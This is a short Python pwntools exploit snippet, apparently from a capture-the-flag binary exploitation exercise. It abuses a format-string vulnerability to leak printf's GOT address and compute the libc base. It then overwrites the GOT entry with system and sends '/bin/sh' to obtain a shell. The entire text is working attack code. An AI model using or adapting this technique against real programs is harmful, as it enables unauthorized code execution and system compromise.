p.sendline(p32(context.binary.got['printf']) + '%7$s' + 'A'*68)
p.recvuntil('You typed: ')
p.recvn(4) # &printf@got
libc_base = u32(p.recvn(4)) - libc.symbols['printf']
p.info('libc@{:08x}'.format(libc_base))
write4(context.binary.got['printf'], libc_base + libc.symbols['system'])
p.recvuntil('Type something>')
p.sendline('/bin/sh')


